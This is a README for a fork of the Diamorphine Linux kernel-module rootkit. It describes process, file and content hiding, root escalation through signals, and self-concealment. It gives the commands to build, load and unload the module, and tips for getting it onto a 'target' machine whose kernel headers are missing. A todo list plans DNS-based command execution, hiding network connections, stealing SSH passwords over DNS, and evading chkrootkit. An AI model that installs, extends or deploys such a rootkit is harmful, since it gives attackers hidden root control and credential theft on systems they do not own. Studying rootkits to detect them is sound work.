Diamorphine
===========

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64.

This fork is just me trying to implement new features in m0nad's awesome rk. 

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisible;

- File content tampering by hooking sys_read (I basically just copied this feature from f0rb1dd3n reptile with a few changes to make it work here. Don't expect much uheauh.  

- Source: https://github.com/m0nad/Diamorphine

Todo and ideas 
--

1 - Test the sys_read hook compatibility across different kernels 
2 - Implement boot persistence 
3 - Implement persistence via DNS lookups, something like making a query to a domain defined in the diamorphine.h every hour, decoding the response hostname field and executing it. I honestly don't even know if it's possible to do this using LKM, but I'll figure a cool way to do this I hope. 
4 - Implement a way of hiding UDP/TCP connections 
5 - Something pretty freaking cool would be hooking the SSHD auth_password function and exfiltrating the credentials via DNS, again, I don't even know if this is possible to do using LKM, but I'll try. 
6 - Chkrootkit bypass 

Configure
--

For file content tampering, modify diamorphine.h `HIDETAGIN` and `HIDETAGOUT`, all content inside those tags (including the tags itself) will be hidden.   

```
#define HIDETAGIN "<viajano>"
#define HIDETAGOUT "</viajano>"
```
Install
--

Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Uninstall
--

The module starts invisible, to remove you need to make it visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```

Installing it on really fucked up machines 
-- 
A lot of times the kernel headers will be missing, tips: 
1 - /lib/modules/`uname -r`/build is just a symlink to /usr/src/linux-headers-`uname -r`, sometimes the symlink is pointing to a path that no longer exists but the kernel headers are installed in /usr/src 
2 - If the kernel headers are really missing or incompatible, you need to install them, apt-get install linux-headers-`uname -r` will fail 99% of the time, try installing other versions of the package. Also, the repository list of the target could be fucked up. 
3 - If nothing works, download locally the same version of the kernel that the box is using, compile it, install the headers, compile diamorphine and upload the LKM files into the target. 
4 - If you're crazy or just have nothing to lose, you can try live kernel patching. 

References
--
f0rb1dd3n RK 
https://github.com/f0rb1dd3n/Reptile/

Ritsec Linux Syscall Hooking introduction
https://ritcsec.wordpress.com/2020/11/22/linux-syscall-hooking/

Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/

zizzu0 LinuxKernelModules
https://github.com/zizzu0/LinuxKernelModules/

Linux Rootkits: New Methods for Kernel 5.7+
https://xcellerator.github.io/posts/linux_rootkits_11/
